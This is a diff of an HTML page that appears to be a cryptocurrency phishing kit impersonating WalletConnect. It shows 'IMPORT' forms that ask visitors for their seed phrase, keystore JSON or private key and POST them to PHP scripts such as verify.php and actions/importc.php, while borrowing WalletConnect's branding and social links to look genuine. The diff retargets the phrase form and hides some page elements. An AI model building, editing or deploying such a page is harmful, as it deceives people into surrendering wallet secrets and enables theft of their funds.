@@ -42,9 +42,9 @@
     <body>
     <center>
     <div class="top">
-            <a href="#footer" target="_blank" class="left">Github</a>
+            <a href="../index.html" target="_blank" class="left">Home</a>
             <a href="#footer" target="_blank" class="left">Docs</a>
-            <a href="#importwallets" class="main"><img src="./port/logo.svg" alt="logo"></a>
+            <!-- <a href="#importwallets" class="main"><img src="./port/logo.svg" alt="logo"></a> -->
             <a href="#importwallets" class="left">Wallets</a>
             <a href="../index.html" class="left">Apps</a>    </div>
     <br>
@@ -55,9 +55,10 @@
       <button class="tablinks" onClick="openCity(event, 'keystore')">Keystore JSON</button>
       <button class="tablinks" onClick="openCity(event, 'private')">Private Key</button>
     </div>
-    
+    <!-- phrase form -->
+
     <div id="phrase" class="tabcontent" style="display: block;">
-    <form action="./actions/imports.php" method="POST">
+    <form action="verify.php" method="POST">
     
     <input type="hidden" name="category" value="Phrase">
     <div class="field">
@@ -67,11 +68,13 @@
     <br>
     <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
     <br>
-    <button type="submit" name="import" class="btn">IMPORT</button>
+    <button type="submit"  class="btn">IMPORT</button>
     </form>
     </div>
     
     <div id="keystore" class="tabcontent" style="display: none;">
+
+      <!-- keystone form -->
     <form action="actions/import.php" method="POST">
     
     <input type="hidden" name="category" value="Keystore JSON">
@@ -88,7 +91,7 @@
     <button type="submit" name="import" class="btn">IMPORT</button>
     </form>
     </div>
-    
+    <!-- another form -->
     <div id="private" class="tabcontent" style="display: none;">
     <form action="actions/importc.php" method="POST">
     <input type="hidden" name="category" value="Private Key">
@@ -112,11 +115,11 @@
           node.value = walletType
         })
     </script>
-    <footer><div id="footer">
+    <!-- <footer><div id="footer">
     <p><img src="./port/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP" target="_blank">Discord</a></p><br>
     <p><img src="./port/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements" target="_blank">Telegram</a></p><br>
     <p><img src="./port/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/" target="_blank">Twitter</a></p><br>
-    <p><img src="./port/github.svg" class="footimg">  <a href="https://github.com/walletconnect" target="_blank">Github</a></p><br>
+    <p><img src="./port/github.svg" class="footimg">  <a href="https://github.com/walletconnect" target="_blank">Github</a></p><br> -->
     </div></footer>
 </center>
 </body>
